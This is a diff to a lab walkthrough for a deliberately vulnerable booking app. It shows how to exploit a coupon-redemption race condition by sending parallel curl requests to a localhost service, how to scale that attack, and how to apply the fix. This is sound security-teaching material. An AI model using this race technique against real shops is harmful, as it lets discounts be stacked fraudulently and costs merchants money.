@@ -36,7 +36,6 @@ Common real-world examples:
 
 ```bash
 docker compose up -d
-dotnet run --project src/BookingDojo.Api -- --seed-and-exit
 dotnet run --project src/BookingDojo.Api &
 dotnet run --project src/BookingDojo.Bff &
 cd src/bookingdojo-ui && npm run dev &
@@ -118,10 +117,10 @@ The 500 ms delay is artificial and exists to make the race window exploitable in
 
 ## Step 3 — Exploit the race condition
 
-Re-seed the database to reset coupon state:
+Reset the database to restore coupon state:
 
 ```bash
-dotnet run --project src/BookingDojo.Api -- --seed-and-exit
+bash scripts/reset-db.sh
 ```
 
 Log in and send two requests simultaneously. Use `&` to background both before `wait`:
@@ -178,12 +177,15 @@ This is the financial impact: the attacker extracted an extra $10.80 of discount
 
 ## Step 4 — Scale the attack
 
-With more parallelism, more discount stacks:
+With more parallelism, more discount stacks. Reset the database first so the coupon count is back to 0:
 
 ```bash
-# 5 concurrent redemptions — resets first so count starts at 0
-curl -s -b cookies.txt -X DELETE \
-  "http://localhost:5001/bff/coupons/redeem?code=SAVE10"
+bash scripts/reset-db.sh
+
+# Log back in after the reset
+curl -s -c cookies.txt -X POST http://localhost:5001/bff/auth/login \
+  -H "Content-Type: application/json" \
+  -d '{"username":"partner","password":"Partner1234!"}' | jq .
 
 for i in $(seq 1 5); do
   curl -s -b cookies.txt -X POST http://localhost:5001/bff/coupons/redeem \
@@ -224,7 +226,7 @@ POST /bff/coupons/redeem (×2 concurrent, SAVE10 MaxUses=1)
                 └─ Req 2 loses: 0 rows affected → 409 Conflict
 ```
 
-## Step 5 — Apply the fix
+## Step 6 — Apply the fix
 
 In `appsettings.json`:
 
@@ -232,11 +234,15 @@ In `appsettings.json`:
 "CouponRedemptionRaceCondition": "Fixed"
 ```
 
-Restart the API, re-seed, and repeat the parallel attack:
+Reset the database, restart the API, and repeat the parallel attack:
 
 ```bash
-dotnet run --project src/BookingDojo.Api -- --seed-and-exit
+bash scripts/reset-db.sh
 dotnet run --project src/BookingDojo.Api &
+
+curl -s -c cookies.txt -X POST http://localhost:5001/bff/auth/login \
+  -H "Content-Type: application/json" \
+  -d '{"username":"partner","password":"Partner1234!"}' | jq .
 
 curl -s -b cookies.txt -X POST http://localhost:5001/bff/coupons/redeem \
   -H "Content-Type: application/json" \
